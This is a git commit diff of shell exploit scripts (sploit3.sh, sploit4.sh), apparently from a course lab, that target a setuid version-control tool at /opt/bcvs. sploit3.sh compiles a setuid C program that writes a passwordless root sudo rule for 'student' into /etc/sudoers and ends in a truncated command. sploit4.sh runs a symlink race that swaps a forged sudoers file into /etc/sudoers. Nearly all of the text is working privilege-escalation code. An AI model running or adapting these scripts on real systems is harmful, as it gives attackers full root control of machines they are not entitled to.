b34a43cd30a1596d8eacaeb824acb38ffc694dc0
Alex Biedny <abiedny09@gmail.com>
2020-10-20 22:58:56 -0500

    maybe race!

--- sploit3.sh
+++ sploit3.sh
@@ -1,36 +1,30 @@
-#setup
-#USER=";/tmp/a.sh;"
-touch /opt/bcvs/anything.txt
+#not a thing 
 
-#setup the script to be ran as root by bcvs
-touch /opt/bcvs/chown
-chmod +x /opt/bcvs/chown
-echo "
-#!/bin/sh
-printf "\nstudent ALL=(ALL) NOPASSWD: ALL\n" >> /etc/sudoers
-" >> /opt/bcvs/chown
+file="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaau+sw"
 
-#checkin a valid file...
+cd /opt/bcvs
+touch hack.c
+echo '
+#include <stdlib.h>
+#include <unistd.h>
+void main() {
+    setuid(0);
+    system("printf \"\nstudent ALL=(ALL) NOPASSWD: ALL\n\" >> /etc/sudoers");
+}
+' >> hack.c
+cc hack.c -o aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaau+sw
+touch yeehaw
+
 /usr/bin/expect -c '
 sleep 0.5
-spawn /opt/bcvs/bcvs ci /opt/bcvs/anything.txt
+cd /opt/bcvs
+sleep 0.5
+spawn ./bcvs ci yeehaw
 sleep 0.5
 expect "Please write a SHORT explanation:\r"
 sleep 0.5
-send "naw\n"
+send "hello\n"
 sleep 0.5
 '
 
-#check it out so that the chown execlp runs...
-/usr/bin/expect -c '
-sleep 0.5
-cd ~/test
-sleep 0.5
-spawn /opt/bcvs/bcvs co anything.txt
-sleep 0.5
-expect "Please write a SHORT explanation:\r"
-sleep 0.5
-send "no thanks\n"
-sleep 0.5
-'
-sudo /bin/sh
+ln -s 
---
+++ sploit4.sh
@@ -0,0 +1,138 @@
+#lets do a race condition between when is_blocked() is called and the write!
+USER="root"
+cd /opt/bcvs
+touch helper.sh
+chmod +x helper.sh
+echo "
+cd /opt/bcvs
+rm sudoers_but_better
+ln -s /etc/sudoers sudoers_but_better
+" >> helper.sh
+
+touch sudoers_but_better
+echo "## sudoers file.
+##
+## This file MUST be edited with the 'visudo' command as root.
+## Failure to use 'visudo' may result in syntax or file permission errors
+## that prevent sudo from running.
+##
+## See the sudoers man page for the details on how to write a sudoers file.
+##
+
+##
+## Host alias specification
+##
+## Groups of machines. These may include host names (optionally with wildcards),
+## IP addresses, network numbers or netgroups.
+# Host_Alias	WEBSERVERS = www1, www2, www3
+
+##
+## User alias specification
+##
+## Groups of users.  These may consist of user names, uids, Unix groups,
+## or netgroups.
+# User_Alias	ADMINS = millert, dowdy, mikef
+
+##
+## Cmnd alias specification
+##
+## Groups of commands.  Often used to group related commands together.
+# Cmnd_Alias	PROCESSES = /usr/bin/nice, /bin/kill, /usr/bin/renice, \
+# 			    /usr/bin/pkill, /usr/bin/top
+# Cmnd_Alias	REBOOT = /sbin/halt, /sbin/reboot, /sbin/poweroff
+
+##
+## Defaults specification
+##
+## You may wish to keep some of the following environment variables
+## when running commands via sudo.
+##
+## Locale settings
+# Defaults env_keep += "LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET"
+##
+## Run X applications through sudo; HOME is used to find the
+## .Xauthority file.  Note that other programs use HOME to find   
+## configuration files and this may lead to privilege escalation!
+# Defaults env_keep += "HOME"
+##
+## X11 resource path settings
+# Defaults env_keep += "XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"
+##
+## Desktop path settings
+# Defaults env_keep += "QTDIR KDEDIR"
+##
+## Allow sudo-run commands to inherit the callers' ConsoleKit session
+# Defaults env_keep += "XDG_SESSION_COOKIE"
+##
+## Uncomment to enable special input methods.  Care should be taken as
+## this may allow users to subvert the command being run via sudo.
+# Defaults env_keep += "XMODIFIERS GTK_IM_MODULE QT_IM_MODULE QT_IM_SWITCHER"
+##
+## Uncomment to use a hard-coded PATH instead of the user's to find commands
+# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+##
+## Uncomment to send mail if the user does not enter the correct password.
+# Defaults mail_badpass
+##
+## Uncomment to enable logging of a command's output, except for
+## sudoreplay and reboot.  Use sudoreplay to play back logged sessions.
+# Defaults log_output
+# Defaults!/usr/bin/sudoreplay !log_output
+# Defaults!/usr/local/bin/sudoreplay !log_output
+# Defaults!REBOOT !log_output
+
+##
+## Runas alias specification
+##
+
+##
+## User privilege specification
+##
+root ALL=(ALL) ALL
+
+## Uncomment to allow members of group wheel to execute any command
+# %wheel ALL=(ALL) ALL
+
+## Same thing without a password
+%wheel ALL=(ALL) NOPASSWD: ALL
+
+## Uncomment to allow members of group sudo to execute any command
+# %sudo	ALL=(ALL) ALL
+
+## Uncomment to allow any user to run sudo if they know the password
+## of the user they are running the command as (root by default).
+# Defaults targetpw  # Ask for the password of the target user
+# ALL ALL=(ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'
+
+## Read drop-in files from /etc/sudoers.d
+## (the '#' here does not indicate a comment)
+#includedir /etc/sudoers.d
+student ALL=(ALL) NOPASSWD: ALL
+" >> sudoers_but_better
+
+#checkin fake sudoers
+/usr/bin/expect -c '
+sleep 0.5
+cd /opt/bcvs
+sleep 0.5
+spawn ./bcvs ci sudoers_but_better
+sleep 0.5
+expect "Please write a SHORT explanation:\r"
+sleep 0.5
+send -- "no\n"
+sleep 0.5
+'
+
+#checkout fake sudoers, but wait when it tells ya to enter the log
+#this will take a while cuz sleep 30
+/usr/bin/expect -c '
+sleep 0.5
+cd /opt/bcvs
+sleep 0.5
+spawn ./bcvs co sudoers_but_better
+sleep 0.5
+expect "Please write a SHORT explanation:\r"
+sleep 5
+send -- "no\n"
+sleep 0.5
+' && ./helper.sh
